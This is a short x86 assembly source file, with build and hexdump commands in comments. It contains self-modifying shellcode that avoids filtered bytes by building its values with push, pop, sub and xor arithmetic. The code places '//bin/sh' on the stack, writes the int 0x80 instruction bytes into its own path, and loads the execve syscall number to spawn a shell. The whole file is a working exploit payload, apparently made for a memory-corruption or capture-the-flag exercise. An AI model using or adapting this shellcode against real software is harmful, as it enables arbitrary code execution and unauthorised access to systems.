# gcc -m32 -g -nostartfiles -nostdlib -static -no-pie shellcode.s -static -o shellcode
# objcopy --dump-section .text=shellcode-raw ./shellcode && hexdump -C shellcode-raw

.global _start
_start:
.intel_syntax noprefix
    push 0x30303030
    pop eax
    sub eax, 0x30303030  

    push eax
    pop esi                  # set ESI = 0x00000000
    
    push eax
    pop ecx                  # set ECX = 0x00000000

    push eax
    pop edx                  # set EDX = 0x00000000
    
    push eax                 # push null
    push 0x68732f6e          # push 'hs/nib//' to stack 
    push 0x69622f2f 
    push esp                 # push ESP Addr to stack

    pop ebx                  #load ESP Addr to EBX

    push esp                 # move ESP to EIP to keep \x80cd at the end of //bin/sh
    pop eax


    # addr = (ESP - EIP + 2^32)/3
    sub eax, 0x55555564      #eax= eax- addr
    sub eax, 0x55555562      #eax= eax- addr
    sub eax, 0x55555562      #eax= eax- addr

    push eax
    pop esp

    push esi
    pop eax                  #set EAX = 0x00000000
    dec eax                  #set EAX = 0xFFFFFFFF

    # Generate 0xcd80 
    xor ax, 0x3654
    xor ax, 0x4966
    push eax

    pop eax
    pop eax

    # Generate syscall (0xb)
    push 0x3030303b
    pop eax
    sub eax, 0x30303030     # set EAX = 0x0000000b
